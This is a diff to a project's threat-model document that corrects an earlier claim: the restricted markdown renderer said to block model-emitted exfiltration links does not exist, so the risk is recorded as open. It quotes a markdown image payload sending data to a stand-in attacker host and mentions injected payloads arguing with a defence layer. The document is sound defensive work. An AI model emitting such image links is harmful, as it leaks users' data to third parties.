@@ -468,11 +468,26 @@ made the ordering clear, and the ordering is the finding:
    content cannot terminate its own block, but a sufficiently clever payload can
    argue with layer 3. Layers 1 and 2 cannot be argued with.
 
-"Output filtering" is deliberately NOT claimed as a control. The UI renders
-restricted markdown with no autolinking and no remote images (PR4), which stops
-a model-emitted `![](https://attacker/?data=…)` from becoming an exfiltration
-channel; that is a rendering constraint, not a filter on model output, and
-calling it filtering would overclaim.
+"Output filtering" is deliberately NOT claimed as a control.
+
+**MODEL-OUTPUT EXFILTRATION IS AN OPEN RISK, NOT A HANDLED ONE.** An earlier
+draft of this paragraph credited PR4 with "restricted markdown, no autolinking,
+no remote images", which would stop a model-emitted
+`![](https://attacker/?data=…)` from becoming an exfiltration channel. **That
+control does not exist.** PR4 shipped the readiness surface only — deterministic
+analyser findings, rendered from enum codes by `apps/web/src/lib/findings.ts` —
+and there is no conversation UI, no markdown renderer, and no BFF conversation
+resolver anywhere in the repo. No model-authored text reaches a browser today,
+so the risk is not live; what was wrong was dispositioning it against a control
+nobody had built, which is the M4 legal-hold zero-callers shape and exactly how
+a gap survives review.
+
+The requirement therefore stands OPEN, owed by whoever ships the chat surface:
+model output must render through a restricted renderer with no autolinking and
+no remote image loading, and that constraint must arrive in the same PR as the
+first pixel of model-authored text. It is a rendering constraint, not a filter
+on model output — calling it filtering would overclaim — and until it exists
+this section must not be read as covering it.
 
 **TB5 — the LLM provider boundary.** The assistant is the isolating service:
 the provider SDK and its credential will exist only there (PR2). It holds NO
